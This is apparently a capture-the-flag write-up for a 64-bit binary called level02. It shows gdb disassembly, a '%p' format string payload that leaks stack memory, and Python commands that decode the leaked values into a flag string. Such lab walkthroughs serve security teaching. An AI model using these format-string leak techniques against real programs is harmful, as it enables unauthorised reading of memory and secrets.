Using gdb, we notice the binary is compiled in 64 bit.
0x0000000000400a9a <+646>:   mov    %rax,%rdi
0x0000000000400a9d <+649>:   mov    $0x0,%eax
0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt>

We tried to overflow with 101 characters but it didn't work, the program stopped.

Since printf() is called with a buffer variable as a parameter and fopen() is called to get user input, we can read the stack (aka format string exploit) :

python -c 'print "%p " * 30' | ./level02]
0x7fffffffe500 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!

We notice 5 different consecutive addresses :
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d

The solution is to convert the addresses from hex to ascii without forgetting to reverse the endianness by using python's list slicing.

python -c 'print"756e505234376848".decode("hex")[::-1] + "45414a3561733951".decode("hex")[::-1] + "377a7143574e6758".decode("hex")[::-1] + "354a35686e475873".decode("hex")[::-1] + "48336750664b394d".decode("hex")[::-1]' > /tmp/flag
cat /tmp/flag 
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H